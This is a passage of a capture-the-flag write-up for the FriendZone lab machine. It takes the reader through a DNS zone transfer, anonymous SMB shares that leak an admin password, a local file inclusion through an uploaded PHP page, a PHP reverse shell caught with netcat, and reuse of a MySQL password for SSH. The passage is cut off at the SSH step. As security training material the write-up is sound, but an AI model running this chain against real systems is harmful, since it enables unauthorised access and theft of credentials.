&lt;blockquote&gt;
  &lt;p&gt;FriendZone is an easy difficulty Linux box which needs fair amount enumeration. By doing a zone transfer vhosts are discovered. There are open shares on samba which provides credentials for an admin panel. From there, an LFI is found which is leveraged to get RCE. A cron is found running which uses a writable module, making it vulnerable to hijacking.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;As we can see, we will be performing zone transfers to find VHosts (Virtual Hosts).&lt;/p&gt;

&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;

&lt;p&gt;For our approach mindset, we shall separate it as the following steps:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Reconnaissance&lt;/li&gt;
  &lt;li&gt;Getting foothold&lt;/li&gt;
  &lt;li&gt;System enumeration&lt;/li&gt;
  &lt;li&gt;Privilege escalation&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;step-1---reconnaissance&quot;&gt;&lt;a href=&quot;#step1-recon&quot;&gt;&lt;/a&gt;Step 1 - Reconnaissance&lt;/h2&gt;

&lt;p&gt;We start by enumerating the system’s TCP ports:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 1000 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; ports.nmap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.129.35.124
&lt;span class=&quot;c&quot;&gt;# Nmap 7.94 scan initiated Thu Jan 18 13:12:35 2024 as: nmap -p- -T4 --min-rate 1000 -oN ports.nmap -A -Pn 10.129.35.124&lt;/span&gt;
Warning: 10.129.35.124 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.35.124
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.50s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 64930 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 598 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
443/tcp open  ssl/http    Apache httpd 2.4.29
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: 400 Bad Request
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;friendzone.red/organizationName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;CODERED/stateOrProvinceName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;CODERED/countryName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent &lt;span class=&quot;nb&quot;&gt;time
&lt;/span&gt;445/tcp open  netbios-p   Samba smbd 4.7.6-Ubuntu &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Aggressive OS guesses: Linux 3.16 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;95%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, ASUS RT-N56U WAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Linux 3.4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;95%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Linux 3.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;93%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Linux 3.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;93%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Linux 3.13 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;93%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Linux 3.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;93%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Linux 3.2 - 4.9 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;93%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, DD-WRT v3.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Linux 4.4.2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;93%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Linux 4.10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;93%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, AXIS 210A or 211 Network Camera &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Linux 2.6.17&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;93%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
No exact OS matches &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;host &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;test &lt;/span&gt;conditions non-ideal&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Network Distance: 2 hops
Service Info: Hosts: FRIENDZONE, 127.0.1.1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OSs: Unix, Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_clock-skew: mean: 2h22m34s, deviation: 1h09m10s, median: 3h02m30s
| smb-os-discovery: 
|   OS: Windows 6.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Samba 4.7.6-Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00
|   Domain name: &lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00
|   FQDN: friendzone
|_  System &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2024-01-18T18:21:42+02:00
| smb2-time: 
|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2024-01-18T16:21:42
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

TRACEROUTE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;using port 8080/tcp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
HOP RTT       ADDRESS
1   946.09 ms 10.10.16.1
2   946.18 ms 10.129.35.124

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Nmap done at Thu Jan 18 13:19:58 2024 -- 1 IP address (1 host up) scanned in 442.67 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, we have ports 21, 22, 53, 80, 139, 443, and 445 open. Nothing too interesting about FTP, since Anonymous login is disabled. Having port 53 open indicates that we have a DNS service listening on TCP, which is a strong indication that this server is not just a DNS client, but also a DNS server. Typically, DNS queries are handled over UDP, but TCP is used for operations that require reliability and for larger responses, such as zone transfers.&lt;/p&gt;

&lt;p&gt;We also see that the TLS common name is friendzone.red. That being said, we might have a way to zone transfer this domain name to the machine’s IP address and retrieve subdomains under that name. To do so, we will be using dig:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig axfr friendzone.red @10.129.35.124

&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; DiG 9.18.21 &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; axfr friendzone.red @10.129.35.124
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; Query &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 483 msec
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; SERVER: 10.129.35.124#53&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.129.35.124&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; WHEN: Thu Jan 18 17:07:52 UTC 2024
&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; XFR size: 8 records &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;messages 1, bytes 289&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;From here, we see that we have lots of subdomains pointing to this address, and the transfer was successful. To access these endpoints, we are going to be adding them to our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo &quot;10.129.35.124 friendzone.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red &amp;gt;&amp;gt; /etc/hosts&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;If we try to access the administrator’s subdomain, we are welcomed with a login page:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/fz1.png&quot; alt=&quot;admin login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But we do not have any credentials to log in. From the machine info, we see that credentials are stored in a SMB share that has public access. Let’s enumerate the shares and find these credentials:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;smbclient &lt;span class=&quot;nt&quot;&gt;--no-pass&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 10.129.35.124

        Sharename       Type      Comment
        &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        print&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;         Disk      Printer Drivers
        Files           Disk      FriendZone Samba Server Files /etc/Files
        general         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;           IPC       IPC Service &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FriendZone server &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Samba, Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
SMB1 disabled &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; no workgroup available
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And after connecting to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Development&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;general&lt;/code&gt;, we find the credentials in the latter:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;smbclient &lt;span class=&quot;nt&quot;&gt;--no-pass&lt;/span&gt; //10.129.35.124/general
Try &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt; to get a list of possible commands.
smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                   D        0  Wed Jan 16 20:10:51 2019
  ..                                  D        0  Tue Sep 13 14:56:24 2022
  creds.txt                           N       57  Tue Oct  9 23:52:42 2018

                3545824 blocks of size 1024. 1540052 blocks available
smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; get creds.txt
getting file &lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;reds.txt of size 57 as creds.txt &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.1 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 0.1 KiloBytes/sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;creds.txt
creds &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the admin THING:

admin:WORKWORKHhallelujah@#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After that, we rush back to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;administrator1&lt;/code&gt; subdomain to successfully log in. Now, we have access to this endpoint:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/fz2.png&quot; alt=&quot;admin dashboard&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The page seems to be asking for URL parameters image_id and pagename. Let’s find out what happens here when we pass the default parameters suggested by the page:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/fz3.png&quot; alt=&quot;inside calls from dashboard&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It seems the page is able to display another page that resides server-side if we pass it under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pagename&lt;/code&gt;. This does not help much, however, we might be able to upload a test page to some of the SMB shares and access it with LFI technique. Acessing the Development share with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbclient&lt;/code&gt;, we see that we are able to upload files into it:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; put creds.txt
putting file creds.txt as &lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;reds.txt &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.1 kb/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 0.1 kb/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                   D        0  Thu Jan 18 20:28:52 2024
  ..                                  D        0  Tue Sep 13 14:56:24 2022
  creds.txt                           A       57  Thu Jan 18 20:28:53 2024
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;However, we need to find the path to this file in order to display it under the admin dashboard. To do so, we will be using Nmap again:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; smb-enum-shares.nse 10.129.35.124 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 445
Starting Nmap 7.94 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2024-01-18 17:27 UTC
Stats: 0:00:34 elapsed&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 0 hosts completed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 1 undergoing Script Scan
NSE Timing: About 0.00% &lt;span class=&quot;k&quot;&gt;done
&lt;/span&gt;Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;friendzone.red &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.129.35.124&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;10.129.35.124&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;evelopment: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 0
|     Max Users: &amp;lt;unlimited&amp;gt;
|     Path: C:&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;tc&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;evelopment
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we can see, the path to this directory is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/Development&lt;/code&gt;. However, after attempting to display &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;creds.txt&lt;/code&gt; on the page, I had no success. Maybe the service only displays php files? That’s what we are going to try now. Let’s create a php script:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;&amp;lt;h1&amp;gt;mula&amp;lt;/h1&amp;gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;save it under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test.php&lt;/code&gt; and upload it to the Development share. Now, we try to access it by giving &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pagename=/etc/Development/test&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/fz4.png&quot; alt=&quot;successful LFI&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Confirming the vulnerability!&lt;/p&gt;

&lt;h2 id=&quot;step-2---getting-foothold&quot;&gt;&lt;a href=&quot;#step3-foothold&quot;&gt;&lt;/a&gt;Step 2 - Getting foothold&lt;/h2&gt;

&lt;p&gt;We will now upload PentestMonkey reverse shell (you can get it &lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&quot;&gt;here&lt;/a&gt;) to the Development share. Before that, change the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ip&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$port&lt;/code&gt; variables inside the reverse shell to match the one of your local machine. Then, we can upload it to the machine with SMB:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;smbclient &lt;span class=&quot;nt&quot;&gt;--no-pass&lt;/span&gt; //10.129.35.124/Development
Try &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt; to get a list of possible commands.
smb: &lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; put rev-shell.php
putting file rev-shell.php as &lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ev-shell.php &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9.4 kb/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;average 9.4 kb/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, we start our netcat on the port we assigned on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$port&lt;/code&gt; variable and pass the parameter in the URL &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pagename=/etc/Development/rev-shell&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 1234
Connection from 10.129.35.124:37272
Linux FriendZone 4.15.0-36-generic &lt;span class=&quot;c&quot;&gt;#39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;
 22:50:45 up  4:50,  0 &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;&apos;t access tty; job control turned off
$ whoami
www-data
$ 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and we are inside! After poking around the web-service files, I stumbled upon a file named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysql_data.conf&lt;/code&gt;, which contained the following content:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
/var/www/friendzone
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;admin
friendzone
friendzoneportal
friendzoneportaladmin
html
mysql_data.conf
uploads
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;mysql_data.conf
&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;development process this is the mysql creds &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user friend

&lt;span class=&quot;nv&quot;&gt;db_user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;friend

&lt;span class=&quot;nv&quot;&gt;db_pass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Agpyu12!0.213&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;db_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FZ
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Revealing the friend user password to be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Agpyu12!0.213$&lt;/code&gt;. Even though this password might be for MySQL service, we can try to use it to SSH into the machine as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;friend&lt;/code&gt;. We will see that this is actually the SSH user’s password as well:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;friend@FriendZone:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
